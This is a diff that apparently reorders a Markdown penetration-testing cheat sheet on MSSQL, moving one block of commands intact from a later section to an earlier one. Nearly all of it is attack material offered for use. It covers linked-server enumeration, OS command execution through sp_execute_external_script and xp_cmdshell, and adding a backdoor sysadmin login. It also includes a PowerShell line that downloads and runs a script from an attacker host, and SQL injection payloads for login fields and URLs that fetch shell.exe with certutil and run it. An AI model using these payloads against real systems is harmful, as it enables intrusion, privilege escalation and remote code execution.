@@ -164,6 +164,93 @@ $ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 ```
 
+### Linked SQL Server Enumeration
+
+```c
+SQL> SELECT user_name();
+SQL> SELECT name,sysadmin FROM syslogins;
+SQL> SELECT srvname,isremote FROM sysservers;
+SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
+```
+
+### Python Code Execution
+
+```c
+SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'print( "foobar" );';
+SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami");';
+```
+
+### Register new Sysadmin User
+
+```c
+SQL> EXEC ('EXEC (''EXEC sp_addlogin ''''sadmin'''', ''''p4ssw0rd!'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
+```
+
+### xp_cmdshell
+
+#### Execute Script HTTP Server
+
+```c
+SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LHOST>/<SCRIPT>.ps1\");"
+```
+
+#### Start xp_cmdshell via MSSQL
+
+```c
+SQL> EXEC sp_configure 'Show Advanced Options', 1;
+SQL> reconfigure;
+SQL> sp_configure;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> reconfigure
+SQL> xp_cmdshell "whoami"
+```
+
+##### Alternative Way to start xp_cmdshell
+
+```c
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+#### Import PowerShell Scripts and execute Commands
+
+##### Without Authentication
+
+```c
+SQL> xp_cmdshell powershell -c import-module C:\PATH\TO\FILE\<FILE>.ps1; <FILE> <OPTIONS>
+```
+
+##### With Authentication
+
+```c
+SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\",\"<PASSWORD>\");Import-Module C:\PATH\TO\FILE\<FILE>.ps1;<FILE> <OPTIONS>
+```
+
+#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) on a Logon Field
+
+```c
+';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
+';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
+';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
+```
+
+#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) in URL
+
+```c
+http://<RHOST>/index.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+```
+
+```c
+http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/<FILE>.exe C:\Windows\Temp\<FILE>.exe'; --
+```
+
+```c
+http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
+```
+
 ## mssqlclient.py
 
 ### Common Commands
@@ -343,93 +430,6 @@ db1: /PATH/TO/DATABASE/<DATABASE>.db
 sqlite> .tables
 db1.DeletedUserAudit  db1.Ldap              db1.Misc
 sqlite> SELECT ## FROM db1.DeletedUserAudit;
-```
-
-### Linked SQL Server Enumeration
-
-```c
-SQL> SELECT user_name();
-SQL> SELECT name,sysadmin FROM syslogins;
-SQL> SELECT srvname,isremote FROM sysservers;
-SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
-```
-
-### Register new Sysadmin User
-
-```c
-SQL> EXEC ('EXEC (''EXEC sp_addlogin ''''sadmin'''', ''''p4ssw0rd!'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
-```
-
-### Python Code Execution
-
-```c
-SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'print( "foobar" );';
-SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami");';
-```
-
-### xp_cmdshell
-
-#### Execute Script HTTP Server
-
-```c
-SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LHOST>/<SCRIPT>.ps1\");"
-```
-
-#### Start xp_cmdshell via MSSQL
-
-```c
-SQL> EXEC sp_configure 'Show Advanced Options', 1;
-SQL> reconfigure;
-SQL> sp_configure;
-SQL> EXEC sp_configure 'xp_cmdshell', 1;
-SQL> reconfigure
-SQL> xp_cmdshell "whoami"
-```
-
-##### Alternative Way to start xp_cmdshell
-
-```c
-SQL> enable_xp_cmdshell
-SQL> xp_cmdshell whoami
-```
-
-#### Import PowerShell Scripts and execute Commands
-
-##### Without Authentication
-
-```c
-SQL> xp_cmdshell powershell -c import-module C:\PATH\TO\FILE\<FILE>.ps1; <FILE> <OPTIONS>
-```
-
-##### With Authentication
-
-```c
-SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\",\"<PASSWORD>\");Import-Module C:\PATH\TO\FILE\<FILE>.ps1;<FILE> <OPTIONS>
-```
-
-#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) on a Logon Field
-
-```c
-';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
-';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
-';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
-```
-
-#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) in URL
-
-```c
-http://<RHOST>/index.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
-```
-
-```c
-http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/<FILE>.exe C:\Windows\Temp\<FILE>.exe'; --
-```
-
-```c
-http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
 ```
 
 ## mysqldump
